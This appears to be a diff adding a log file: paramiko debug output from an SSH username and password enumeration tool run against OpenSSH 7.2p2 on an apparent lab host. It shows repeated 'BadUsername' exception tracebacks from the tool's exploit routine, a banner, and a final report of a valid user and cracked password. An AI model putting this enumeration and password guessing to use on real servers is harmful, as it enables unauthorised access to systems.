@@ -1,0 +1,107 @@
+DEBUG:paramiko.transport:starting thread (client mode): 0x8bb57780
+DEBUG:paramiko.transport:Local version/idstring: SSH-2.0-paramiko_2.4.1
+DEBUG:paramiko.transport:Remote version/idstring: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4
+INFO:paramiko.transport:Connected (version 2.0, client OpenSSH_7.2p2)
+DEBUG:paramiko.transport:kex algos:['curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group14-sha1'] server key:['ssh-rsa', 'rsa-sha2-512', 'rsa-sha2-256', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+DEBUG:paramiko.transport:Kex agreed: ecdh-sha2-nistp256
+DEBUG:paramiko.transport:HostKey agreed: ssh-ed25519
+DEBUG:paramiko.transport:Cipher agreed: aes128-ctr
+DEBUG:paramiko.transport:MAC agreed: hmac-sha2-256
+DEBUG:paramiko.transport:Compression agreed: none
+DEBUG:paramiko.transport:kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+DEBUG:paramiko.transport:Switch to new keys ...
+DEBUG:paramiko.transport:userauth is OK
+ERROR:paramiko.transport:Unknown exception: 
+ERROR:paramiko.transport:Traceback (most recent call last):
+ERROR:paramiko.transport:  File "/usr/local/lib/python3.5/dist-packages/paramiko/transport.py", line 1949, in run
+ERROR:paramiko.transport:    handler(self.auth_handler, m)
+ERROR:paramiko.transport:  File "./suope.py", line 41, in call_error
+ERROR:paramiko.transport:    raise BadUsername()
+ERROR:paramiko.transport:exploit.<locals>.BadUsername
+ERROR:paramiko.transport:
+DEBUG:paramiko.transport:starting thread (client mode): 0x8bdf29e8
+DEBUG:paramiko.transport:Local version/idstring: SSH-2.0-paramiko_2.4.1
+DEBUG:paramiko.transport:Remote version/idstring: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4
+INFO:paramiko.transport:Connected (version 2.0, client OpenSSH_7.2p2)
+DEBUG:paramiko.transport:kex algos:['curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group14-sha1'] server key:['ssh-rsa', 'rsa-sha2-512', 'rsa-sha2-256', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+DEBUG:paramiko.transport:Kex agreed: ecdh-sha2-nistp256
+DEBUG:paramiko.transport:HostKey agreed: ssh-ed25519
+DEBUG:paramiko.transport:Cipher agreed: aes128-ctr
+DEBUG:paramiko.transport:MAC agreed: hmac-sha2-256
+DEBUG:paramiko.transport:Compression agreed: none
+DEBUG:paramiko.transport:kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+DEBUG:paramiko.transport:Switch to new keys ...
+DEBUG:paramiko.transport:userauth is OK
+ERROR:paramiko.transport:Unknown exception: 
+ERROR:paramiko.transport:Traceback (most recent call last):
+ERROR:paramiko.transport:  File "/usr/local/lib/python3.5/dist-packages/paramiko/transport.py", line 1949, in run
+ERROR:paramiko.transport:    handler(self.auth_handler, m)
+ERROR:paramiko.transport:  File "./suope.py", line 41, in call_error
+ERROR:paramiko.transport:    raise BadUsername()
+ERROR:paramiko.transport:exploit.<locals>.BadUsername
+ERROR:paramiko.transport:
+DEBUG:paramiko.transport:starting thread (client mode): 0x89b44320
+DEBUG:paramiko.transport:Local version/idstring: SSH-2.0-paramiko_2.4.1
+DEBUG:paramiko.transport:Remote version/idstring: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4
+INFO:paramiko.transport:Connected (version 2.0, client OpenSSH_7.2p2)
+DEBUG:paramiko.transport:kex algos:['curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group14-sha1'] server key:['ssh-rsa', 'rsa-sha2-512', 'rsa-sha2-256', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+DEBUG:paramiko.transport:Kex agreed: ecdh-sha2-nistp256
+DEBUG:paramiko.transport:HostKey agreed: ssh-ed25519
+DEBUG:paramiko.transport:Cipher agreed: aes128-ctr
+DEBUG:paramiko.transport:MAC agreed: hmac-sha2-256
+DEBUG:paramiko.transport:Compression agreed: none
+DEBUG:paramiko.transport:kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+DEBUG:paramiko.transport:Switch to new keys ...
+DEBUG:paramiko.transport:userauth is OK
+ERROR:paramiko.transport:Unknown exception: 
+ERROR:paramiko.transport:Traceback (most recent call last):
+ERROR:paramiko.transport:  File "/usr/local/lib/python3.5/dist-packages/paramiko/transport.py", line 1949, in run
+ERROR:paramiko.transport:    handler(self.auth_handler, m)
+ERROR:paramiko.transport:  File "./suope.py", line 41, in call_error
+ERROR:paramiko.transport:    raise BadUsername()
+ERROR:paramiko.transport:exploit.<locals>.BadUsername
+ERROR:paramiko.transport:
+DEBUG:paramiko.transport:starting thread (client mode): 0x8bb57588
+DEBUG:paramiko.transport:Local version/idstring: SSH-2.0-paramiko_2.4.1
+DEBUG:paramiko.transport:Remote version/idstring: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4
+INFO:paramiko.transport:Connected (version 2.0, client OpenSSH_7.2p2)
+DEBUG:paramiko.transport:kex algos:['curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group14-sha1'] server key:['ssh-rsa', 'rsa-sha2-512', 'rsa-sha2-256', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+DEBUG:paramiko.transport:Kex agreed: ecdh-sha2-nistp256
+DEBUG:paramiko.transport:HostKey agreed: ssh-ed25519
+DEBUG:paramiko.transport:Cipher agreed: aes128-ctr
+DEBUG:paramiko.transport:MAC agreed: hmac-sha2-256
+DEBUG:paramiko.transport:Compression agreed: none
+DEBUG:paramiko.transport:kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+DEBUG:paramiko.transport:Switch to new keys ...
+DEBUG:paramiko.transport:userauth is OK
+DEBUG:paramiko.transport:EOF in transport thread
+DEBUG:paramiko.transport:starting thread (client mode): 0x89b4d2e8
+DEBUG:paramiko.transport:Local version/idstring: SSH-2.0-paramiko_2.4.1
+DEBUG:paramiko.transport:Remote version/idstring: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4
+INFO:paramiko.transport:Connected (version 2.0, client OpenSSH_7.2p2)
+DEBUG:paramiko.transport:kex algos:['curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group14-sha1'] server key:['ssh-rsa', 'rsa-sha2-512', 'rsa-sha2-256', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+DEBUG:paramiko.transport:Kex agreed: ecdh-sha2-nistp256
+DEBUG:paramiko.transport:HostKey agreed: ssh-ed25519
+DEBUG:paramiko.transport:Cipher agreed: aes128-ctr
+DEBUG:paramiko.transport:MAC agreed: hmac-sha2-256
+DEBUG:paramiko.transport:Compression agreed: none
+DEBUG:paramiko.transport:kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+DEBUG:paramiko.transport:Switch to new keys ...
+DEBUG:paramiko.transport:Adding ssh-ed25519 host key for 192.168.56.3: b'2abd74acf53ba98f33f4a3ec770a052b'
+DEBUG:paramiko.transport:userauth is OK
+INFO:paramiko.transport:Authentication (password) successful!
+[36m        
+      SSH User or Password Enmeration  
+
+,adPPYba, 88       88  ,adPPYba,  8b,dPPYba,   ,adPPYba,  
+I8[    "" 88       88 a8"     "8a 88P'    "8a a8P_____88      
+ `"Y8ba,  88       88 8b       d8 88       d8 8PP"
+aa    ]8I "8a,   ,a88 "8a,   ,a8" 88b,   ,a8" "8b,   ,aa 
+`"YbbdP"'  `"YbbdP'Y8  `"YbbdP"'  88`YbbdP"'   `"Ybbd8"' 
+                                  88           
+                                  88 
+                    V1.0.5
+          ASCII Art Credit ascii.co.uk
+                                            
+[34m[+] User: user => is a valid user[0m
+[32m[+] User: user [+] Pass Found: user[0m
